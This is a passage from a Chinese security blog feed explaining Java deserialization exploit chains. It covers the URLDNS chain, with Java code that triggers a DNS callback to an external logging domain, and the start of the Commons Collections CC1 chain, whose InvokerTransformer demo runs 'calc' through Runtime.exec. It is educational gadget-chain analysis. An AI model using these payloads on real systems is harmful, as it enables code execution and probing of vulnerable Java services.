null;</span><br><span class="line">        &#125; catch (SecurityException se) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 u.hostAddress 为空，那么调用 URL 类的 getHost 方法获取主机地址（可以是 IP 也可以是域名），如果获取到的主机地址不为空，那么会调用 InetAddress 类的静态方法 getByName 并将主机名作为参数传入。</p><p>重点来了：InetAddress.getByName 是一个强大而实用的方法，它<strong>允许我们根据主机名获取对应的 IP 地址，并在各种网络应用场景中发挥巨大的作用</strong>。</p><p>在这里就涉及到了 DNS 解析，那么这条利用链的功能也就是归于此处。再往下的源码就不看了，有兴趣可以自己看看。</p><h4 id="反序列化利用"><a href="#反序列化利用" class="headerlink" title="反序列化利用"></a>反序列化利用</h4><h6 id="入口类-HashMap"><a href="#入口类-HashMap" class="headerlink" title="入口类 HashMap"></a>入口类 HashMap</h6><p>选择该类作为入口类的原因很简单：</p><ul><li>实现了 Serializable 接口，可以被反序列化</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public class HashMap&lt;K,V&gt; extends AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt;, Cloneable, Serializable</span><br></pre></td></tr></table></figure><ul><li><p>重写了 readObject 方法</p></li><li><p>参数类型宽泛，只要是 Object 都可以</p></li><li><p>JDK 自带</p></li></ul><p>……</p><h6 id="构造-payload"><a href="#构造-payload" class="headerlink" title="构造 payload"></a>构造 payload</h6><p>先看结果，后面再讲原理</p><p><strong>序列化类 serialization</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class serialization &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        URL url = new URL(&quot;http://jhdmbaithu.dgrh3.cn&quot;);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(&quot;java.net.URL&quot;);</span><br><span class="line">        Field f = clazz.getDeclaredField(&quot;hashCode&quot;);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url,&quot;test&quot;);</span><br><span class="line">        f.set(url,-1);</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个类将 URL 类的对象作为参数传入 hashMap 中，并在 hashMap 用 put 方法将数据存储后利用反射修改了 url 的 hashCode 属性为 -1 。运行后，会将序列化数据输出到 out.bin 文件中，且也会进行一次 DNS 解析。</p><p><strong>由于进行了 DNS 解析，本地存在了解析记录，那么第二次解析就不会去请求 DNS 服务器，所以要刷新一下本地的 DNS 缓存，防止之后执行反序列化看不到解析记录</strong> </p><p>Windows cmd 窗口输入以下命令刷新 DNS 解析缓存：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/flushdns</span><br></pre></td></tr></table></figure><img src="/images/image-20240502132852109.png"><p><strong>反序列化类 unserialization</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class unserialization &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));</span><br><span class="line">        HashMap hashMap = (HashMap) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行反序列化后会多出一条解析记录。</p><p><strong>执行完序列化和反序列化之后，查看 Yakit ，会出现两次解析记录：</strong> </p><img src="/images/image-20240502133353810.png"><h6 id="序列化时进行-DNS-解析的原理"><a href="#序列化时进行-DNS-解析的原理" class="headerlink" title="序列化时进行 DNS 解析的原理"></a>序列化时进行 DNS 解析的原理</h6><p>来看序列化类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class serialization &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        URL url = new URL(&quot;http://jhdmbaithu.dgrh3.cn&quot;);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(&quot;java.net.URL&quot;);</span><br><span class="line">        Field f = clazz.getDeclaredField(&quot;hashCode&quot;);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url,&quot;test&quot;);</span><br><span class="line">        f.set(url,-1);</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>序列化时调用了 HashMap 的 put 方法，查看 put 方法：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">    return putVal(hash(key), key, value, false, true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>put 方法中又调用了 HashMap 的 hash 方法，查看 hash 方法：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static final int hash(Object key) &#123;</span><br><span class="line">    int h;</span><br><span class="line">    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，hash 方法中调用了 key 的 hashCode 方法，而 key 就是我们传入的 URL 对象，也即调用了 URL 对象的 hashCode 方法，因此进行了 DNS 解析。</p><p><strong>为什么要用反射修改 url 的 hashCode 属性值</strong> </p><p>调用了 url 的 hashCode 方法之后，url 的 hashCode 属性便不再是 -1（初始值为 -1 ，调用 hashCode 方法之后会生成新的值），结合 URL 类的 hashCode 方法来看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public synchronized int hashCode() &#123;</span><br><span class="line">    if (hashCode != -1)</span><br><span class="line">        return hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(this);</span><br><span class="line">    return hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下一次调用 url 的 hashCode 方法就不会再调用 handler.hashCode 方法，也就不会进行 DNS 解析了。为了之后的反序列化能够顺利进行 DNS 解析，这里用反射来修改 url 的 hashCode 属性值重新为 -1 。</p><h6 id="反序列化时进行-DNS-解析的原理"><a href="#反序列化时进行-DNS-解析的原理" class="headerlink" title="反序列化时进行 DNS 解析的原理"></a>反序列化时进行 DNS 解析的原理</h6><p>来看反序列化类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class unserialization &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));</span><br><span class="line">        HashMap hashMap = (HashMap) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于 HashMap 重写了 readObject 方法，因此在调用时不会调用 ObjectInputStream 默认的 readObject 方法，而是会调用 HashMap 重写的 readObject 方法。</p><p><strong>查看 HashMap 的 readObject 方法：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    // Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                // Read and ignore number of buckets</span><br><span class="line">    int mappings = s.readInt(); // Read number of mappings (size)</span><br><span class="line">    if (mappings &lt; 0)</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +</span><br><span class="line">                                         mappings);</span><br><span class="line">    else if (mappings &gt; 0) &#123; // (if zero, use defaults)</span><br><span class="line">        // Size the table using given load factor only if within</span><br><span class="line">        // range of 0.25...4.0</span><br><span class="line">        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);</span><br><span class="line">        float fc = (float)mappings / lf + 1.0f;</span><br><span class="line">        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((int)fc));</span><br><span class="line">        float ft = (float)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (int)ft : Integer.MAX_VALUE);</span><br><span class="line">        @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        // Read the keys and values, and put the mappings in the HashMap</span><br><span class="line">        for (int i = 0; i &lt; mappings; i++) &#123;</span><br><span class="line">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, false, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很多很杂，但其实前面的都不重要，直接看末尾的 for 循环中的最后一条语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putVal(hash(key), key, value, false, false);</span><br></pre></td></tr></table></figure><p>见过吧，其实跟序列化时的 put 方法中的内容是一样的，一样的调用了 hash 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static final int hash(Object key) &#123;</span><br><span class="line">    int h;</span><br><span class="line">    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一样的调用了 key 的 hashCode 方法，也即 URL 对象的 hashCode 方法，进行了 DNS 解析。所以如果前面不把 hashCode 改回 -1 的话，反序列化是不会进行 DNS 解析的哦~</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文详尽地讲述了 URLDNS 反序列化利用链的原理&lt;/p&gt;</summary>
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>漏洞篇 - Java 反序列化之 CC1 链</title>
    <link href="https://changeyourway.github.io/2024/05/10/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC1%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>https://changeyourway.github.io/2024/05/10/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC1%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2024-05-10T11:53:40.079Z</published>
    <updated>2024-05-10T13:51:37.121Z</updated>
    
    <content type="html"><![CDATA[<p>Apache Commons Collections 是对 java.util.Collection 的扩展，对常用的集合操作进行了很好的封装、抽象和补充，在保证性能的同时大大简化代码。CC 链正是在 Commons Collections 包中的反序列化利用链，本次介绍的是 CC1 链。</p><span id="more"></span><h2 id="CC1-链"><a href="#CC1-链" class="headerlink" title="CC1 链"></a>CC1 链</h2><p>Apache Commons Collections 是对 java.util.Collection 的扩展，对常用的集合操作进行了很好的封装、抽象和补充，在保证性能的同时大大简化代码。</p><p>CC 链正是在 Commons Collections 包中的反序列化利用链，本次介绍的是 CC1 链。</p><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><ul><li>java &#x3D; 8u65</li><li>CommonsCollections &#x3D; 3.2.1</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h4 id="Transformer-接口"><a href="#Transformer-接口" class="headerlink" title="Transformer 接口"></a>Transformer 接口</h4><p>Apache Commons Collections 包中定义的一个接口，该接口的实现类中包含执行类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">package org.apache.commons.collections;</span><br><span class="line"></span><br><span class="line">public interface Transformer &#123;</span><br><span class="line">    Object transform(Object var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该类中声明了一个 transform 方法。</p><p>鼠标双击选中类名后，Ctrl + H 可以查看该类的继承关系：</p><img src="/images/image-20240504111943167.png"><h4 id="执行类-InvokerTransformer"><a href="#执行类-InvokerTransformer" class="headerlink" title="执行类 InvokerTransformer"></a>执行类 InvokerTransformer</h4><p>该类实现了 Transformer 接口与 Serializable 接口，定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public class InvokerTransformer implements Transformer, Serializable</span><br></pre></td></tr></table></figure><h6 id="利用点在-InvokerTransformer-类重写的-transform-方法中："><a href="#利用点在-InvokerTransformer-类重写的-transform-方法中：" class="headerlink" title="利用点在 InvokerTransformer 类重写的 transform 方法中："></a>利用点在 InvokerTransformer 类重写的 transform 方法中：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">    if (input == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">            return method.invoke(input, this.iArgs);</span><br><span class="line">        &#125; catch (NoSuchMethodException var4) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;);</span><br><span class="line">        &#125; catch (IllegalAccessException var5) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;);</span><br><span class="line">        &#125; catch (InvocationTargetException var6) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class cls = input.getClass();</span><br><span class="line">Method method = cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">return method.invoke(input, this.iArgs);</span><br></pre></td></tr></table></figure><p>会通过反射执行 “input” 类的 “this.iMethodName” 方法，并将 “this.iParamTypes” 类型的参数 “this.iArgs” 传入。</p><p>再来看， input 是 transform 方法的参数，iMethodName ，iParamTypes 和 this.iArgs 都是 InvokerTransformer 中定义的属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private final String iMethodName;</span><br><span class="line">private final Class[] iParamTypes;</span><br><span class="line">private final Object[] iArgs;</span><br></pre></td></tr></table></figure><p>并且在 InvokerTransformer 类的三参构造方法中会赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">    this.iMethodName = methodName;</span><br><span class="line">    this.iParamTypes = paramTypes;</span><br><span class="line">    this.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说，这里的所有参数均可控，那么可以简单的写个小程序验证一下。</p><h6 id="直接利用-InvokerTransformer-弹出计算器"><a href="#直接利用-InvokerTransformer-弹出计算器" class="headerlink" title="直接利用 InvokerTransformer 弹出计算器"></a>直接利用 InvokerTransformer 弹出计算器</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class Demo1 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer =</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">        invokerTransformer.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="/images/image-20240504114336455.png"><p>成功弹出计算器，原理就是通过 invokerTransformer.transform 调用了 runtime 对象的 exec 方法并将 “calc” 作为参数传入。</p><p>接下来就是要找谁调用了 transform 方法，其实 TransformedMap 类调用了此方法。</p><h4 id="利用链之-TransformedMap-类"><a href="#利用链之-TransformedMap-类" class="headerlink" title="利用链之 TransformedMap 类"></a>利用链之 TransformedMap 类</h4><p>TransformedMap 类的 checkSetValue 方法调用了 this.valueTransformer 的 transform 方法： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">protected Object checkSetValue(Object value) &#123;</span><br><span class="line">    return this.valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 valueTransformer 是 TransformedMap 中定义的属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected final Transformer valueTransformer;</span><br></pre></td></tr></table></figure><p>这个属性在构造方法中被赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;</span><br><span class="line">    super(map);</span><br><span class="line">    this.keyTransformer = keyTransformer;</span><br><span class="line">    this.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于构造方法是 protected 修饰的，不能直接被调用，所以还要找是谁调用了 TransformedMap 的构造方法。</p><p>TransformedMap 的 decorate 方法调用了 TransformedMap 的构造方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;</span><br><span class="line">    return new TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这个方法，我们可以将 valueTransformer 属性赋值成 InvokerTransformer 类的对象。</p><p>接下来还要找是谁调用了 TransformedMap 的 checkSetValue 方法，AbstractInputCheckedMapDecorator 类调用了此方法。</p><h4 id="利用链之-AbstractInputCheckedMapDecorator-类"><a href="#利用链之-AbstractInputCheckedMapDecorator-类" class="headerlink" title="利用链之 AbstractInputCheckedMapDecorator 类"></a>利用链之 AbstractInputCheckedMapDecorator 类</h4><p>AbstractInputCheckedMapDecorator 是 TransformedMap 的父类。</p><h6 id="MapEntry-静态内部类"><a href="#MapEntry-静态内部类" class="headerlink" title="MapEntry 静态内部类"></a>MapEntry 静态内部类</h6><p>在这个类中有一个名为 MapEntry 的静态内部类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">static class MapEntry extends AbstractMapEntryDecorator &#123;</span><br><span class="line">    private final AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">    protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123;</span><br><span class="line">        super(entry);</span><br><span class="line">        this.parent = parent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object setValue(Object value) &#123;</span><br><span class="line">        value = this.parent.checkSetValue(value);</span><br><span class="line">        return this.entry.setValue(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MapEntry 的 setValue 方法中调用了 this.parent 的 checkSetValue 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public Object setValue(Object value) &#123;</span><br><span class="line">        value = this.parent.checkSetValue(value);</span><br><span class="line">        return this.entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>parent 是 MapEntry 中定义的一个私有属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private final AbstractInputCheckedMapDecorator parent;</span><br></pre></td></tr></table></figure><p>这个属性在 MapEntry 的构造方法中被赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123;</span><br><span class="line">        super(entry);</span><br><span class="line">        this.parent = parent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于这个构造方法是被 protected 修饰的，所以还是要找是谁调用了它。其实是隔壁的静态内部类 EntrySetIterator 调用了它。</p><h6 id="EntrySetIterator-静态内部类"><a href="#EntrySetIterator-静态内部类" class="headerlink" title="EntrySetIterator 静态内部类"></a>EntrySetIterator 静态内部类</h6><p>EntrySetIterator 也是 AbstractInputCheckedMapDecorator 中的静态内部类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">static class EntrySetIterator extends AbstractIteratorDecorator &#123;</span><br><span class="line">    private final AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">    protected EntrySetIterator(Iterator iterator, AbstractInputCheckedMapDecorator parent) &#123;</span><br><span class="line">        super(iterator);</span><br><span class="line">        this.parent = parent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object next() &#123;</span><br><span class="line">        Map.Entry entry = (Map.Entry)this.iterator.next();</span><br><span class="line">        return new MapEntry(entry, this.parent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 EntrySetIterator 的 next 方法中调用了 MapEntry 的构造方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public Object next() &#123;</span><br><span class="line">        Map.Entry entry = (Map.Entry)this.iterator.next();</span><br><span class="line">        return new MapEntry(entry, this.parent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么为了调用 EntrySetIterator 的 next 方法，我们需要创建一个 EntrySetIterator 对象，但 EntrySetIterator 的构造方法是被 protected 修饰的，所以还要找是谁调用了 EntrySetIterator 的构造方法。</p><p>而在隔壁的静态内部类 EntrySet 中调用了 EntrySetIterator 的构造方法</p><h6 id="EntrySet-静态内部类"><a href="#EntrySet-静态内部类" class="headerlink" title="EntrySet 静态内部类"></a>EntrySet 静态内部类</h6><p>EntrySet 也是 AbstractInputCheckedMapDecorator 中的静态内部类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">static class EntrySet extends AbstractSetDecorator &#123;</span><br><span class="line">    private final AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">    protected EntrySet(Set set, AbstractInputCheckedMapDecorator parent) &#123;</span><br><span class="line">        super(set);</span><br><span class="line">        this.parent = parent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Iterator iterator() &#123;</span><br><span class="line">        return new EntrySetIterator(this.collection.iterator(), this.parent);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 后面的部分省略</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EntrySet 的 iterator 方法调用了 EntrySetIterator 的构造方法，同理，在哪里获得 EntrySet 对象呢？</p><h6 id="entrySet-成员方法"><a href="#entrySet-成员方法" class="headerlink" title="entrySet 成员方法"></a>entrySet 成员方法</h6><p>AbstractInputCheckedMapDecorator 类的 public 方法 entrySet 调用了 